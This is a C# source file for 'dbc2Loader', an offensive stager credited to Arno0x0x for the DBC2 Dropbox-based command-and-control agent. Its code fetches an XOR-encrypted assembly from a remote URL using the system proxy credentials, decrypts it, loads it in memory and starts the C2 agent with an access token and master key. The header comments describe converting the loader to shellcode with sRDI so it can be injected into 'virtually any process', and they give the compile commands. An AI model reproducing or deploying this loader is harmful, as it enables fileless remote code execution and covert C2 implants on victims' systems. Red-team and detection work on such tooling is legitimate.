/*
Author: Arno0x0x, Twitter: @Arno0x0x

What this program does:
-----------------------
This assembly loads the DBC2 agent from a remote URL, xor decrypt it, then loads it in memory and starts it.

What is its purpose ?
-----------------------
dbc2Loader acts as a lightweight wrapper DLL dor the DBC2 agent. It is currently useful for two things:

1/	Allowing it to loaded through DotNetToJScript, which gives us a new JScript loader for the DBC2 agent

2/	Can be loaded from a native wrapper DLL hosting the .Net CLR, and then this native wrapper DLL can be transformed
	into a position independant shellcode thanks to sRDI. This allows for injecting the DBC2 agent in virtually any process !

-------------------- Compile for x64 platform ----------------
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:dbc2Loader.dll dbc2Loader.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:dbc2Loader.exe dbc2Loader.cs


-------------------- Compile for x86 platform ----------------
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:dbc2Loader.dll dbc2Loader.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:dbc2Loader.exe dbc2Loader.cs
*/

using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Windows.Forms;

namespace dbc2Loader
{
	[ComVisible(true)]
	public class dbc2Loader
	{
		//========================================================================================
		// Constructor...
		//========================================================================================
		public dbc2Loader()
		{
			
		}
		
		//========================================================================================
		// Returns the XOR encrpytion/decryption of a source byte array, given a key as a byte array
		//========================================================================================
		private static byte[] xor(byte[] source, string key)
		{
			byte[] decrypted = new byte[source.Length];
		
			for(int i = 0; i < source.Length; i++) {
				decrypted[i] = (byte) (source[i] ^ key[i % key.Length]);
			}
			
			return decrypted;
		}
		
		//========================================================================================
		// Main function called in case of compiled as an EXEcutable
		//========================================================================================
		public static void Main(string[] args)
		{
			if (args.Length == 2)
			{
				(new dbc2Loader()).loadDBC2(args[0], args[1], args[2], args[3]);			
			}
			else { Console.WriteLine("[ERROR] Missing arguments"); }
		}
		
		//========================================================================================
		// Function used when called from native unmanaged code
		//========================================================================================	
		public static int entryPoint(string arg)
		{	
			string[] args = arg.Split('|');
			(new dbc2Loader()).loadDBC2(args[0], args[1], args[2], args[3]);
			return 0;
		}
		
		//========================================================================================
		// Actual method loading the DBC2 agent in memory and executing it
		//========================================================================================
		public void loadDBC2(string url, string xorKey, string accessToken, string masterKey)
		{
			//----------------------------------------------------------------------
			// Download the dbc2 encrypted agent from the provided URL
			//----------------------------------------------------------------------
			WebClient webClient = new WebClient();
			
			IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
			if (defaultProxy != null)
			{
				defaultProxy.Credentials = CredentialCache.DefaultCredentials;
				webClient.Proxy = defaultProxy;
			}
			
			byte[] dbc2Assembly = null;
			
			try
			{
				// Download the encrypted agent assembly and decrpyt it
				dbc2Assembly = xor(webClient.DownloadData(url),xorKey);
			}
			catch (Exception ex)  
			{
				while (ex != null)
				{
					Console.WriteLine(ex.Message);
					ex = ex.InnerException;
				}
			}
			
			//----------------------------------------------------------------------
			// Load assembly in memory
			//----------------------------------------------------------------------
			Assembly assembly = Assembly.Load(dbc2Assembly);
			Type type = assembly.GetType("dropboxc2.C2_Agent");
			
			// Setting DBC2 agent arguments: the access token and the master key
			string[] parameters = new string[] {accessToken, masterKey};
			object[] parametersArray = new object[]{parameters};
			
			try
			{
				// This will create an instance of the C2_Agent class, the constructor will start the whole job, so no further method call is required
				object classInstance = Activator.CreateInstance(type, parametersArray); 
			}
			catch (Exception ex)  
			{
				while (ex != null)
				{
					Console.WriteLine(ex.Message);
					ex = ex.InnerException;
				}
			}
		}
	}
}